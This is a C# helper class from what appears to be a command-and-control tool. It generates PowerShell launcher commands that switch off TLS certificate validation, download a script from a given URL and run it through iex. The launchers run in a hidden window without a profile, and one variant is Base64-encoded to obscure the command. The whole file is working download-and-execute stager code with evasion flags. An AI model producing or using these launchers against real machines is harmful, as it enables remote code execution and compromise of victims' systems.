using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Helper
{
    internal class PowershellHelper
    {

        public const string PowershellSSlScript = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";

        public static string GeneratePowershellScript(string url, bool isSecured)
        {
            string script = string.Empty;

            if (isSecured)
                script += PowershellSSlScript;

            script += $"(New-Object Net.WebClient).DownloadString('{url}') | iex";

            return $"powershell -noP -sta -w 1 -c \"{script}\"";
        }

        public static string GeneratePowershellScriptB64(string url, bool isSecured)
        {
            string script = string.Empty;

            if (isSecured)
                script += PowershellSSlScript;

            script += $"(New-Object Net.WebClient).DownloadString('{url}') | iex";
            string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            return $"powershell -noP -sta -w 1 -e {enc64}";
        }

    }
}
